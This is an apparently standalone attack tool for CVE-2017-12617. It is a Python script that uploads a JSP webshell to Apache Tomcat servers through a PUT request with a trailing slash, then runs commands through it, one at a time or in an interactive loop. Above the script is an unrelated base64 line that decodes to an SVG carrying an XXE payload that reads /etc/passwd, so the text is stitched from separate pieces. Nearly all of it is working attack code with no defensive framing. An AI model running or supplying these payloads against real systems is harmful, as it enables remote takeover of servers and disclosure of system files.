PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHRlc3QgWyAgCiAgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4KXT4KPHN2ZyB3aWR0aD0iNTAwcHgiIGhlaWdodD0iNTAwcHgiIHhtbG5zPSJodHRwOi8vdzMub3JnIj4KICA8dGV4dCBmb250LXNpemU9IjE2IiB4PSIyMCIgeT0iNDAiPiZ4eGU7PC90ZXh0Pgo8L3N2Zz4K
#!/usr/bin/env python3
import requests
import sys
import argparse
import time
import random
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings (ignore cert errors)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def exploit(target_url, payload_file=None, cmd=None):
    """
    target_url: https://target.com:8443/
    """
    jsp_name = random_string(8) + ".jsp"
    
    # JSP webshell payload
    if cmd:
        jsp_code = f"""<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {{
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.BufferedReader reader = new java.io.BufferedReader(
            new java.io.InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {{
            out.println(line + "<br>");
        }}
    }}
%>"""
    else:
        # Read from payload file
        with open(payload_file, 'r') as f:
            jsp_code = f.read()
    
    # Upload path with trailing slash (bypass)
    upload_url = target_url.rstrip('/') + '/' + jsp_name + '/'
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Uploading {jsp_name}...")
    
    try:
        # PUT request - SSL verify disabled!
        response = requests.put(
            upload_url,
            data=jsp_code,
            verify=False,           # IGNORE CERTIFICATE
            timeout=30,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if response.status_code in [201, 204]:
            shell_url = target_url.rstrip('/') + '/' + jsp_name
            print(f"[+] Upload successful!")
            print(f"[+] Shell URL: {shell_url}?cmd=id")
            
            if cmd:
                print(f"\n[*] Testing command execution:")
                test_response = requests.get(
                    shell_url,
                    params={"cmd": "id"},
                    verify=False,
                    timeout=10
                )
                if test_response.status_code == 200:
                    print(test_response.text[:500])
            
            return shell_url
        else:
            print(f"[-] Upload failed. Status: {response.status_code}")
            return None
            
    except requests.exceptions.SSLError as e:
        print(f"[-] SSL Error: {e}")
        print("[!] Try adding -k flag to curl equivalents")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def interactive_shell(shell_url):
    """Simple interactive shell via webshell"""
    print("\n[*] Interactive shell. Type 'exit' to quit.")
    while True:
        try:
            cmd = input("$> ")
            if cmd.lower() in ['exit', 'quit']:
                break
            if not cmd.strip():
                continue
                
            response = requests.get(
                shell_url,
                params={"cmd": cmd},
                verify=False,
                timeout=10
            )
            print(response.text)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description='CVE-2017-12617 Tomcat RCE Exploit (HTTPS Support)')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://10.0.0.1:8443/)')
    parser.add_argument('-p', '--payload', help='Local JSP payload file')
    parser.add_argument('-c', '--cmd', help='Single command to execute')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive shell mode after upload')
    
    args = parser.parse_args()
    
    if args.payload and args.cmd:
        print("[-] Use either --payload OR --cmd, not both")
        sys.exit(1)
    
    shell_url = exploit(args.url, args.payload, args.cmd)
    
    if shell_url and args.interactive:
        interactive_shell(shell_url)

if __name__ == "__main__":
    main()
